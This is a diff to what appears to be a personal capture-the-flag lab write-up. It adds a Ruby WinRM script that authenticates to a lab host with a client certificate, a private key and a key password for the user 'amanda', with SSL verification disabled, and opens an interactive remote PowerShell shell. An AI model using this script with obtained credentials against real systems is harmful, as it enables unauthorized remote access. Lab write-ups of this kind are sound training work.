@@ -83,3 +83,41 @@ Now we are getting this error
 ![[Pasted image 20240408170210.png]]
 
 ![[Pasted image 20240408181853.png]]
+
+What i was doing wrong is that i was giving the wring certnew.cer (i.e the one we have downloaded). Authenticate through SSL using ruby (i.e. winrm)
+```
+require 'winrm'
+
+# Author: Alamot
+
+conn = WinRM::Connection.new(
+  endpoint: 'https://10.10.10.103:5986/wsman',
+  transport: :ssl,
+  client_cert: 'certnew.cer',
+  client_key: 'amanda.key',
+  key_pass: 'testing',
+  :no_ssl_peer_verification => true
+)
+
+command=""
+
+conn.shell(:powershell) do |shell|
+    until command == "exit\n" do
+        output = shell.run("-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')")
+        print(output.output.chomp)
+        command = gets
+        output = shell.run(command) do |stdout, stderr|
+            STDOUT.print stdout
+            STDERR.print stderr
+        end
+    end
+    puts "Exiting with code #{output.exitcode}"
+end
+```
+
+
+```
+ruby psremote.rb
+```
+![[Pasted image 20240408221759.png]]
+
